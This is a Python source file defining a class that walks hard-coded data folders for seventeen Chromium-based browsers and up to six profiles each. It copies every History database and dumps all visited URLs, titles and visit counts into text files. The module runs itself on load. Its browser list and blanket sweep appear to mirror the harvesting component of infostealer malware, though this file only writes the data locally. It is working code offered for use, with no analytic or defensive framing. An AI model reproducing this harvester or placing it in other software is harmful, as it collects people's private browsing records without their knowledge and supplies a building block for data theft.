import os
import sqlite3
import shutil

class BrowserHistory:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }
        
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

    def get_history(self):
        for browser, path in self.browsers.items():
            for profile in self.profiles:
                history_db_path = os.path.join(path, profile, 'History')
                if os.path.exists(history_db_path):
                    self.extract_history(history_db_path, browser, profile)

    def extract_history(self, db_path, browser, profile):
        # Copy the database to avoid locking issues
        temp_db_path = db_path + '_temp'
        shutil.copy(db_path, temp_db_path)
        
        # Connect to the copied database
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        # Query to get the URLs from the history
        cursor.execute("SELECT url, title, visit_count FROM urls")
        rows = cursor.fetchall()
        
        # Save the history to a text file
        with open(f"{browser}_{profile}_history.txt", "w", encoding="utf-8") as f:
            for row in rows:
                f.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\n\n")
        
        # Clean up
        conn.close()
        os.remove(temp_db_path)

# Example usage
history_extractor = BrowserHistory()
history_extractor.get_history()

